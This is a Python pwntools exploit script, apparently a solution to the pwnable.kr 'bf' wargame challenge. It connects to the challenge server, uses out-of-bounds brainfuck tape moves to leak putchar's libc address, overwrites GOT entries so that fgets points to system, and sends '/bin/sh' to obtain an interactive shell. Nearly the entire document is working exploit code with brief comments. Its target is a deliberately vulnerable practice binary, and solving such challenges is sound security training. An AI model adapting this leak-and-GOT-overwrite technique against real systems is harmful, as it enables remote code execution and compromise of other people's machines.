from pwn import *

# p = process('./bf')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('pwnable.kr', 9001)
libc = ELF('bf_libc.so')

payload = '<'*0x70 + '..>.>.>.>'    # leak address of putchar
payload += '<,<,<,<,'   # overwrite putchar's got to main
payload += '<,<,<,<,'   # overwrite memset's got to gets
payload += '<'*0x1c     # change index to got of fgets
payload += ',>,>,>,.'   # overwrite got of fgets to system

p.sendlineafter('except [ ]\n', payload)
p.recv(1)
putchar = u32(p.recv(4))
base = putchar - libc.sym['putchar']
system = base + libc.sym['system']
gets = base + libc.sym['gets']
main = 0x8048671
success('libc base = 0x%x', base)
success('system = 0x%x', system)
success('gets = 0x%x', gets)
p.send(p32(main)[::-1])
p.send(p32(gets)[::-1])
p.send(p32(system))
p.sendline('/bin/sh\x00')

p.interactive()